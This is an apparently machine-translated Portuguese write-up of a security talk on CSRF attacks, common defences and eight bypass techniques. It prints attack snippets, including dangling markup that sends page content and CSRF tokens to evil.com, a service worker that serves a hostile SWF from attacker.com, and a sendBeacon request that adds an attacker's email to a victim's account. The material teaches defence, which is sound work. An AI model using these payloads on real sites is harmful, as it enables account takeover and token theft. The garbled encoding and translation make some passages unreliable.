<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëñ ü§≥üèº üì• As vulnerabilidades do CSRF ainda s√£o relevantes üîì ‚òùüèº üöπ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="O CSRF (falsifica√ß√£o de solicita√ß√£o entre sites) traduzido para o russo √© uma falsifica√ß√£o de solicita√ß√µes entre sites. Mikhail Egorov ( 0ang3el ), em...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>As vulnerabilidades do CSRF ainda s√£o relevantes</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/oleg-bunin/blog/412855/">  O CSRF (falsifica√ß√£o de solicita√ß√£o entre sites) traduzido para o russo √© uma falsifica√ß√£o de solicita√ß√µes entre sites.  <strong>Mikhail Egorov</strong> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" class="user_link">0ang3el</a> ), em seu relat√≥rio no <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Highload ++</a> 2017, falou sobre as vulnerabilidades do CSRF, sobre quais mecanismos de prote√ß√£o s√£o geralmente usados ‚Äã‚Äãe como eles podem ser contornados de qualquer maneira.  E, no final, ele trouxe uma s√©rie de dicas sobre como se defender adequadamente contra ataques de CSRF.  Sob decodifica√ß√£o de gato deste desempenho. <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/x5AuK_IbJlg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  <strong>Sobre o palestrante:</strong> Mikhail Egorov trabalha na Ingram Micro Cloud e atua na seguran√ßa de aplicativos.  Em seu tempo livre, Mikhail est√° envolvido na busca de vulnerabilidades e ca√ßa de bugs e fala em confer√™ncias de seguran√ßa. <br><br>  <strong>Isen√ß√£o de responsabilidade:</strong> as informa√ß√µes fornecidas s√£o apenas da opini√£o do autor, todas as correspond√™ncias s√£o aleat√≥rias. <br><img src="https://habrastorage.org/webt/rx/zu/uu/rxzuuu_ccpo8uw9opgjbutrs-hk.jpeg"><br><br>  Esse monstro dos cookies √© o culpado pelo fato de os ataques CSRF funcionarem.  O fato √© que muitos aplicativos da Web usam cookies (a seguir, consideramos apropriado chamar cookies em russo) para controlar a sess√£o do usu√°rio.  O navegador foi projetado para que, se houver cookies de usu√°rio para esse dom√≠nio e caminho, ele os envie automaticamente junto com a solicita√ß√£o HTTP. <br><a name="habracut"></a><br><h3>  Cookies <br></h3><br>  Um cookie √© um pequeno peda√ßo de dados que um servidor da Web envia para um cliente na forma de name = value em um cabe√ßalho HTTP chamado ‚ÄúSet-Cookie‚Äù.  O navegador armazena esses dados no computador do usu√°rio e, sempre que necess√°rio, envia esses dados para o servidor da Web como parte de uma solicita√ß√£o HTTP em um cabe√ßalho HTTP chamado "Cookie". <br><br>  Os cookies podem ter v√°rios atributos, como: expira, dom√≠nio, seguro, ATUALMENTE: <br><br>  Os cookies apareceram pela primeira vez no navegador Netscape em 1994.  Muitos aplicativos da web ainda os usam para gerenciar a sess√£o de um usu√°rio. <br><img src="https://habrastorage.org/webt/ja/hh/ue/jahhuedxwbccdc82v97tqub7geq.jpeg"><br><br>  Vamos ver como o ataque cl√°ssico de falsifica√ß√£o de solicita√ß√£o entre sites (CSRF) funciona. <br><br>  Digamos que nosso aplicativo Web tenha a capacidade de alterar o endere√ßo de entrega do usu√°rio e utilize cookies para controlar a sess√£o. <br><br>  Temos um formul√°rio HTML que o usu√°rio deve preencher: digite o endere√ßo e clique no bot√£o "Salvar".  Como resultado, uma solicita√ß√£o POST com um formul√°rio HTML voar√° para o back-end.  Vimos que o navegador define automaticamente os cookies de sess√£o do usu√°rio.  O back-end, quando recebe uma solicita√ß√£o, v√™ que existe uma sess√£o, √© um usu√°rio leg√≠timo e altera seu endere√ßo de entrega. <br><br>  O que um invasor pode fazer? <br><img src="https://habrastorage.org/webt/3n/cn/eh/3ncnehuga46_ltfvzfsgm3pb1ii.jpeg"><br><br>  Ele pode colocar uma p√°gina HTML em seu site <em>attacker.com</em> que realmente envia o formul√°rio HTML como <em>exemplo</em> <em>.</em>  <em>com</em> .  Como o navegador insere automaticamente os cookies do usu√°rio na solicita√ß√£o HTTP, o back-end simplesmente n√£o entende se a solicita√ß√£o √© leg√≠tima - √© o resultado do preenchimento do formul√°rio pelo usu√°rio ou √© um ataque de CSRF - e alterar√° o endere√ßo de entrega do usu√°rio para um valor ben√©fico para o invasor . <br><br>  H√° outra op√ß√£o para um ataque CSRF usando a API XHR.  Se muitos ouviram falar sobre o ataque CSRF usando formul√°rios HTML, eles sabem menos sobre esse m√©todo, mas tamb√©m funciona. <br><img src="https://habrastorage.org/webt/vn/tw/s3/vntws3ykrle2c_xr6ztikub5q60.jpeg"><br><br>  Observe o atributo withCredentials, que faz com que o navegador envie automaticamente cookies do usu√°rio.  Como o valor do tipo de conte√∫do √© application / x-www-form-urlencoded, o navegador enviar√° essa solicita√ß√£o sem a solicita√ß√£o de verifica√ß√£o pr√©via das op√ß√µes CORS e, novamente, o ataque do CSRF funcionar√°. <br><br>  Vamos considerar mais claramente como isso acontece. <br><img src="https://habrastorage.org/webt/ry/w2/dq/ryw2dquhy1hnddg0mkufscf8k4m.jpeg"><br><br>  Dados de origem: <br><br><ul><li>  aplicativo <i>example.com</i> vulner√°vel ao CSRF, <br></li><li>  usu√°rio <br></li><li>  site do invasor, onde h√° uma p√°gina csrf-xhr.html. <br></li></ul><br>  O usu√°rio √© autenticado no aplicativo, localizado em <i>example.com</i> .  Se ele for ao site do invasor, uma solicita√ß√£o POST ser√° executada automaticamente, o que mudar√° o endere√ßo de entrega.  O navegador inserir√° automaticamente os cookies da sess√£o na solicita√ß√£o e o back-end alterar√° o endere√ßo. <br><br><h2>  Hist√≥rico de Ataques CSRF <br></h2><br>  Em geral, os ataques CSRF s√£o conhecidos desde 2001, quando come√ßaram a ser ativamente explorados.  No per√≠odo de 2008 a 2012, essas vulnerabilidades ocorreram em todos os primeiros sites, incluindo: <br><br><ol><li>  YouTube <br></li><li>  The New York Times; <br></li><li>  Badoo <br></li><li>  Slideshare <br></li><li>  Vimeo; <br></li><li>  Hulu; <br></li><li>  Pesquisa de Cinema; <br></li><li>  ... <br></li></ol><br><h2>  Qu√£o s√©rias s√£o as vulnerabilidades do CSRF? <br></h2><br>  De fato, tudo depende da criticidade da a√ß√£o vulner√°vel.  Pode ser: <br><br><ul><li>  Controle de conta - o atacante captura a conta da v√≠tima alterando o email via CSRF. <br></li><li>  Escalonamento de privil√©gios - aumento de privil√©gios devido ao fato de o invasor por meio do CSRF criar um novo usu√°rio com altos direitos no sistema. <br></li><li>  Execu√ß√£o remota de c√≥digo - execu√ß√£o de c√≥digo devido √† opera√ß√£o de inje√ß√£o de comando no painel de administra√ß√£o via CSRF. <br></li></ul><br>  Vejamos o que as classifica√ß√µes de vulnerabilidades estabelecidas internacionalmente dizem sobre a gravidade do CSRF. <br><br>  No projeto <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">OWASP Top 10</a> , que cont√©m as 10 vulnerabilidades mais cr√≠ticas no aplicativo, em 2010 as vulnerabilidades do CSRF estavam em <strong>quinto lugar</strong> .  Em seguida, os desenvolvedores come√ßaram a implementar v√°rias op√ß√µes de prote√ß√£o e, em 2013, as vulnerabilidades do CSRF passaram para a 8¬™ posi√ß√£o. <br><br>  As vulnerabilidades do CSRF n√£o foram inclu√≠das na lista para 2017, porque supostamente, de acordo com as estat√≠sticas, agora s√£o encontradas no teste de penetra√ß√£o <strong>apenas em 8% dos casos</strong> . <br><br>  Pessoalmente, n√£o concordo com essas estat√≠sticas, porque literalmente nos √∫ltimos dois anos encontrei muitas vulnerabilidades de CSRF.  Em seguida, vou lhe contar como fiz. <br><br>  Na classifica√ß√£o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Bugcrowd VRT</a> (Vulnerability Rating Taxonomy), as vulnerabilidades do CSRF em todo o aplicativo t√™m uma classifica√ß√£o de gravidade de P2 (Alta).  Somente a gravidade cr√≠tica est√° acima, ou seja, essas s√£o <strong>vulnerabilidades bastante s√©rias</strong> . <br><img src="https://habrastorage.org/webt/oh/2p/lv/oh2plvuhqczibq9rm4lmogh1ugi.jpeg"><br><br>  Considere quais op√ß√µes de prote√ß√£o CSRF existem e como cada uma delas funciona. <br><br>  <strong>1. Token CSRF</strong> <br><ul><li>  Para cada sess√£o do usu√°rio, um token exclusivo e <strong>altamente</strong> entr√≥pico √© gerado. <br></li><li>  O token √© inserido no DOM da p√°gina HTML ou √© fornecido ao usu√°rio por meio da API. <br></li><li>  O usu√°rio com cada solicita√ß√£o associada a qualquer altera√ß√£o deve enviar um token no par√¢metro ou no cabe√ßalho HTTP da solicita√ß√£o. <br></li><li>  Como o invasor n√£o conhece o token, o ataque cl√°ssico do CSRF n√£o funciona. <br></li></ul><br>  <strong>2. Enviar cookie duas vezes</strong> <br><ul><li>  Novamente, um token exclusivo e <strong>altamente</strong> entr√≥pico √© gerado para cada sess√£o do usu√°rio, mas √© colocado em cookies. <br></li><li>  O usu√°rio deve passar os mesmos valores na solicita√ß√£o na solicita√ß√£o e no par√¢metro request. <br></li><li>  Se esses dois valores coincidirem nos cookies e no par√¢metro, considera-se que esta √© uma solicita√ß√£o leg√≠tima. <br></li><li>  Como o atacante simplesmente n√£o pode alterar os cookies no navegador do usu√°rio, o ataque CSRF cl√°ssico n√£o funciona. <br></li></ul><br>  <strong>3. Prote√ß√£o baseada em tipo de conte√∫do</strong> <br><ul><li>  O usu√°rio deve enviar uma solicita√ß√£o com um cabe√ßalho de tipo de conte√∫do espec√≠fico, por exemplo, application / json. <br></li><li>  Como √© imposs√≠vel enviar uma origem cruzada arbitr√°ria do Tipo de Conte√∫do no navegador por meio do formul√°rio HTML ou da API XHR, o ataque CSRF cl√°ssico n√£o funciona novamente. <br></li></ul><br>  <strong>4. Prote√ß√£o baseada em referenciador</strong> <br><ul><li>  O usu√°rio deve enviar uma solicita√ß√£o com um valor espec√≠fico do cabe√ßalho do Referer.  O back-end verifica se, se estiver incorreto, considera-se que se trata de um ataque CSRF. <br></li><li>  Como o navegador n√£o pode enviar um referenciador arbitr√°rio por meio de um formul√°rio HTML ou da API XHR, o ataque cl√°ssico ao CSRF n√£o funciona. <br></li></ul><br>  <strong>5. Confirma√ß√£o de senha / websudo</strong> <br><ul><li>  O usu√°rio deve confirmar a a√ß√£o com uma senha (ou segredo). <br></li><li>  Como o atacante n√£o o conhece, o ataque cl√°ssico do CSRF n√£o funciona. <br></li></ul><br>  <strong>6. Cookies SameSite no Chrome, Opera</strong> <br>  Esta √© uma nova tecnologia projetada para proteger contra CSRF.  No momento, ele funciona apenas em dois navegadores (Chrome, Opera). <br><br><ul><li>  Um cookie √© definido com um atributo adicional - samesite, que pode ter dois valores: lax ou strict. <br></li><li>  A ess√™ncia da tecnologia √© que o navegador n√£o envia cookies se a solicita√ß√£o for feita de outro dom√≠nio, por exemplo, do site do invasor.  Assim, isso novamente protege contra o ataque cl√°ssico do CSRF. <br></li></ul><br>  Infelizmente, em qualquer lugar, existem recursos de navegadores, aplicativos da Web e sua implanta√ß√£o, que √†s vezes <strong>permitem ignorar a prote√ß√£o contra CSRF</strong> . <br><br>  Portanto, agora vamos falar sobre <strong>8 maneiras de ignorar a prote√ß√£o</strong> que pode ser usada na pr√°tica. <br><img src="https://habrastorage.org/webt/fh/tk/rx/fhtkrxcjtbvw2mfyxctik-zqizc.jpeg"><br><br><h3>  <strong>Cen√°rios de solu√ß√£o alternativa:</strong> <br></h3><br>  <strong>1. XSS (cross-sitescripting)</strong> <br><br>  Se o seu aplicativo da Web tiver XSS, isso automaticamente o tornar√° vulner√°vel ao CSRF e ser√° dif√≠cil se proteger disso.  <strong>Voc√™ s√≥ pode colocar</strong> . <br><br>  <strong>2. Marca√ß√£o pendente</strong> <br><br>  Digamos que nosso aplicativo tenha uma vulnerabilidade √† inje√ß√£o de HTML, mas n√£o h√° XSS.  Por exemplo, existe uma Pol√≠tica de Seguran√ßa de Conte√∫do (CSP) que protege contra o XSS.  Mas um invasor ainda pode incorporar tags HTML. <br><br>  Se nosso aplicativo implementar prote√ß√£o com base em tokens CSRF, o invasor poder√° incorporar esse HTML, que n√£o s√£o imagens fechadas ou tags de formul√°rio: <br><br><pre><code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">img</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'https://evil.com/log_csrf?html= &lt;form action='</span></span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">http:</span></span></span><span class="hljs-tag">//</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">evil.com</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">log_csrf</span></span></span><span class="hljs-tag">'&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">textarea</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  Como resultado, parte da p√°gina HTML do DOM ser√° enviada ao recurso do invasor.  √â altamente prov√°vel que, se o invasor implementar corretamente esse HTML, o que vier ao site do invasor conter√° um token CSRF. <br><br>  Assim, tendo aprendido o token, o atacante poder√° explorar o CSRF da maneira cl√°ssica. <br><br>  <strong>3. Subdom√≠nio vulner√°vel</strong> <br><br>  Suponha que tenhamos um subdom√≠nio <em>foo.example.com</em> e ele seja vulner√°vel √† <strong>aquisi√ß√£o de subdom√≠nios</strong> ou <strong>XSS.</strong>  Como resultado da aquisi√ß√£o do subdom√≠nio, o invasor controla totalmente o subdom√≠nio e pode adicionar p√°ginas HTML ou executar o c√≥digo JS no contexto do subdom√≠nio.  Se nosso subdom√≠nio estiver vulner√°vel a essas coisas, o invasor poder√° contornar os seguintes tipos de prote√ß√£o CSRF: <br><br><ul><li>  Tokens de CSRF; <br></li><li>  Cookie de envio duplo; <br></li><li>  Prote√ß√£o baseada em tipo de conte√∫do. <br></li></ul><br>  Digamos que nosso aplicativo principal use o <strong>CORS</strong> (compartilhamento de recursos entre origens) para comunica√ß√£o entre dom√≠nios.  Dois cabe√ßalhos s√£o inseridos na resposta do servidor: <br><br><ol><li>  Controle de acesso-Permitir origem: foo.example.com (foo.example.com - subdom√≠nio vulner√°vel); <br></li><li>  Access-Control-Allow-Credentials: true <strong>&nbsp;</strong>  - para que, usando a API XHR, seja poss√≠vel fazer uma solicita√ß√£o com cookies do usu√°rio. <br></li></ol><br>  Se essas condi√ß√µes forem atendidas, o atacante pode simplesmente ler o token CSRF no subdom√≠nio que ele controla e continuar a explorar o CSRF da maneira cl√°ssica. <br><br>  A pr√≥xima op√ß√£o.  Suponha que exista um arquivo <strong>crossdomain.xml</strong> no dom√≠nio principal que queremos atacar.  Esse arquivo √© usado por plugins em flash e PDF para intera√ß√£o com subdom√≠nios, e o acesso a ele a partir de qualquer subdom√≠nio √© permitido. <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">cross-domain-policy</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">allow-access-from</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">domain</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"*.example.com"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">cross-domain-policy</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Se o invasor puder fazer upload do arquivo JS para <i>foo.example.com</i> , nesse caso, ele poder√° usar a API do Service Worker para o subdom√≠nio foo.example.com, que na verdade fornece o arquivo flash. <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> url = <span class="hljs-string"><span class="hljs-string">"https://attacker.com/bad.swf"</span></span>; onfetch = <span class="hljs-function"><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) =&gt;</span></span> { e.respondWith(fetch(url); }</code> </pre><br>  Como temos crossdomain.xml no dom√≠nio principal, o que permite a intera√ß√£o de subdom√≠nios, o atacante simplesmente l√™ o token CSRF atrav√©s desse SWF. <br><br><blockquote>  A prop√≥sito, uma vulnerabilidade semelhante foi encontrada recentemente na Amazon, mais detalhes <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> . <br></blockquote><br>  Mesmo que o CORS n√£o esteja configurado e n√£o haja um arquivo crossdomain.xml, mas a prote√ß√£o de cookie de envio duplo seja usada, um invasor pode simplesmente inserir cookies do subdom√≠nio do dom√≠nio pai no caminho em que ele deseja explorar o CSRF e, assim, ignorar a prote√ß√£o de cookie de envio duplo. <br><br>  <strong>4. PDF incorreto</strong> <br><br>  Esta solu√ß√£o alternativa √© baseada em PDF.  A Adobe possui um plug-in PDF que √© instalado automaticamente quando voc√™ instala o Adobe Reader.  Este plugin suporta o chamado script FormCalc.  No entanto, agora o plug-in PDF da Adobe funciona apenas no IE11 e no Firefox ESR. <br><br>  O FormCalc possui dois √≥timos m√©todos: get () e post ().  Um invasor usando o m√©todo get pode ler o token CSRF, usando post, envi√°-lo para o site.  Portanto, o invasor recebe o token CSRF da v√≠tima. <br><br>  Suponha que tenhamos a capacidade de fazer upload de um arquivo PDF para um aplicativo da web.  De fato, pode at√© ser um arquivo de formato diferente, por exemplo, um invasor pode tentar baixar um PDF sob o disfarce de uma imagem, que √© o avatar do usu√°rio. <br><br>  O aplicativo possui alguma API no dom√≠nio principal, que permite obter o conte√∫do do arquivo baixado.  Em seguida, o invasor pode usar uma p√°gina HTML que incorpora o arquivo PDF que o invasor carregou no <i>example.com</i> usando a tag incorporar. <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span>Nothing to see here!<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">embed</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://example.com/shard/x1/sh/leak.pdf"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'application/pdf'</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Arquivo <strong>Leak.pdf</strong> : <br><img src="https://habrastorage.org/webt/ua/nb/7w/uanb7wix-egv6kro7ntqby84gnm.jpeg"><br><br>  Esse arquivo cont√©m um script FormCalc, que apenas l√™ a p√°gina Settings.action, onde h√° um token CSRF no DOM e o envia usando o m√©todo post para o site do invasor. <br><br>  Como o PDF √© baixado do example.com, este PDF em si tem acesso total a todos os <code>https://example.com</code> origem e pode ler dados de l√° sem violar o modo Pol√≠tica de mesma origem (SOP). <br><br>  Um foco adicional √© que, para o plug-in PDF, n√£o importa com qual tipo de conte√∫do o arquivo PDF √© fornecido, e mesmo a resposta HTTP pode conter outros cabe√ßalhos (por exemplo, Disposi√ß√£o-conte√∫do).  O plug-in PDF ainda renderiza esse PDF e executa o script FormCalc. <br><br>  <strong>5. Inje√ß√£o de biscoitos</strong> <br><br>  Se a prote√ß√£o de envio duplo de cookies for usada, se o invasor puder, de alguma forma, introduzir cookies, o jogo terminar√°. <br><br>  Uma das op√ß√µes mais populares nesse cen√°rio √© a <strong>inje√ß√£o de</strong> <strong>CRLF</strong> . <br><br>  Se o invasor puder inserir cabe√ßalhos adicionais na resposta do servidor, ele poder√° simplesmente adicionar o cabe√ßalho Set-Cookie com os cookies necess√°rios e ignorar a prote√ß√£o CSRF. <br><br>  Outra op√ß√£o est√° relacionada aos <strong>recursos de manipula√ß√£o de cookies do navegador</strong> . <br><br>  Por exemplo, no Safari, voc√™ pode usar v√≠rgula para inserir novos cookies (cookies separados por v√≠rgula).  Suponha que tenhamos um par√¢metro de URL no cabe√ßalho chamado language.  N√≥s processamos e escrevemos o valor do idioma selecionado para o usu√°rio em cookies.  Se o invasor inserir uma v√≠rgula, ele poder√° inserir cookies adicionais com qualquer nome. <br><br>  Al√©m disso, ignorar a prote√ß√£o CSRF pode ajudar os <strong>erros do navegador</strong> .  Por exemplo, no Firefox, foi poss√≠vel incorporar cookies por meio de uma imagem SVG ( <strong>CVE-2016-9078)</strong> .  Se tivermos um editor HTML e permitirmos que o usu√°rio insira tags de imagem, o invasor poder√° simplesmente apontar para a imagem SVG no atributo SRC, que definir√° os cookies necess√°rios. <br><br>  <strong>6. Alterar tipo de conte√∫do</strong> <br><blockquote>  Alguns desenvolvedores acreditam que, se voc√™ usar um formato de dados n√£o padr√£o no corpo de uma solicita√ß√£o POST para se comunicar com o back-end, isso poder√° salv√°-lo do CSRF.  Este n√£o √© realmente o caso. <br></blockquote><br>  Como exemplo, cito uma vulnerabilidade que encontrei recentemente em um servi√ßo de gerenciamento de notas muito popular. <br><br>  Ele usou uma API que usa o Apache Thrift (formato de dados bin√°rios) e cookies para controlar a sess√£o.  Por exemplo, para adicionar uma nova anota√ß√£o, o usu√°rio precisava enviar uma solicita√ß√£o POST.  Os dados bin√°rios foram transmitidos no corpo e o Tipo de conte√∫do: application / x-thrift foi especificado. <br><br><pre> <code class="hljs powershell">POST /user/add/note HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> Host: example.com User<span class="hljs-literal"><span class="hljs-literal">-Agent</span></span>: Mozilla/<span class="hljs-number"><span class="hljs-number">5.0</span></span> (X11; Linux x86_64; rv:<span class="hljs-number"><span class="hljs-number">45.0</span></span>) Gecko/<span class="hljs-number"><span class="hljs-number">20100101</span></span> Firefox/<span class="hljs-number"><span class="hljs-number">45.0</span></span> Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number"><span class="hljs-number">0.9</span></span>,*/*;q=<span class="hljs-number"><span class="hljs-number">0.8</span></span> Accept<span class="hljs-literal"><span class="hljs-literal">-Language</span></span>: en<span class="hljs-literal"><span class="hljs-literal">-US</span></span>,en;q=<span class="hljs-number"><span class="hljs-number">0.5</span></span> Accept<span class="hljs-literal"><span class="hljs-literal">-Encoding</span></span>: gzip, deflate Referer: https://example.com Cookie: JSESSIONID=<span class="hljs-number"><span class="hljs-number">728</span></span>FAA7F23EE00B0EDD56D1E220C011E.jvmroute8081; Connection: close Content<span class="hljs-literal"><span class="hljs-literal">-Type</span></span>: application/x<span class="hljs-literal"><span class="hljs-literal">-thrift</span></span> Content<span class="hljs-literal"><span class="hljs-literal">-Length</span></span>: <span class="hljs-number"><span class="hljs-number">43</span></span></code> </pre><br>  De fato, esse tipo de conte√∫do n√£o foi validado no back-end.  Foi poss√≠vel alter√°-lo para texto / sem formata√ß√£o e usar a API XHR para explorar esta vulnerabilidade do CSRF simplesmente passando dados bin√°rios no corpo da solicita√ß√£o POST. <br><img src="https://habrastorage.org/webt/pl/cv/yk/plcvykuxz09ts4h6aooogmms_pe.jpeg"><br><br>  De fato, a seguran√ßa baseada em tipo de conte√∫do √© uma op√ß√£o de seguran√ßa muito ruim.  √â ignorado na maioria dos casos. <br><br>  <strong>7. Tipo de Conte√∫do N√£o Simples</strong> <br><br>  Por meio do formul√°rio HTML ou da API XHR, podemos enviar os seguintes tipos de conte√∫do: <br><br><ul><li>  texto / plan√≠cie; <br></li><li>  application / x-www-form-urlencoded; <br></li><li>  multipart / form-data. <br></li></ul><br>  De fato, √© poss√≠vel enviar qualquer valor do tipo de conte√∫do por: <br><br><ul><li>  erros nos navegadores (por exemplo, Navigator.sendBeacon); <br></li><li>  plug-ins: plug-in Flash + 307 redirecionado e PDF + 307 redirecionado; <br></li><li>  estruturas de back-end. <br></li></ul><br>  Algumas estruturas, como a estrutura JAX-RS Apache CXF, suportam um par√¢metro <strong>chamado ctype</strong> na URL.  Voc√™ pode especificar qualquer tipo de conte√∫do nesse par√¢metro; o back-end examinar√° esse par√¢metro e o utilizar√° em vez do tipo de conte√∫do, que √© passado para o cabe√ßalho ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">link</a> para a fonte). <br><br>  Um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">bug</a> bastante <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">conhecido</a> no navegador Chrome foi encontrado em 2015, ap√≥s o qual, ap√≥s cerca de um m√™s, entrou no acesso p√∫blico, mas foi corrigido apenas em 2017.  Esse bug permitiu enviar uma solicita√ß√£o POST com qualquer tipo de conte√∫do para outra origem usando uma API chamada <strong>Navigator.sendBeacon ().</strong> <br>  Como era a opera√ß√£o? <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> </span><span class="hljs-function"><span class="hljs-keyword"><span class="actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="actionscript"><span class="hljs-function"><span class="hljs-title">jsonreq</span></span></span></span><span class="hljs-params"><span class="actionscript"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span></span><span class="actionscript">{ </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> data = </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'{"action":"add-user-email","Email":"attacker@evil.com"}'</span></span></span><span class="actionscript">; </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> blob = </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">new</span></span></span><span class="actionscript"> Blob([data], {type : </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'application/json;charset=utf-8'</span></span></span><span class="actionscript">}); navigator.sendBeacon(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'https://example.com/home/rpc'</span></span></span><span class="actionscript">, blob ); } jsonreq(); </span></span><span class="hljs-tag"><span 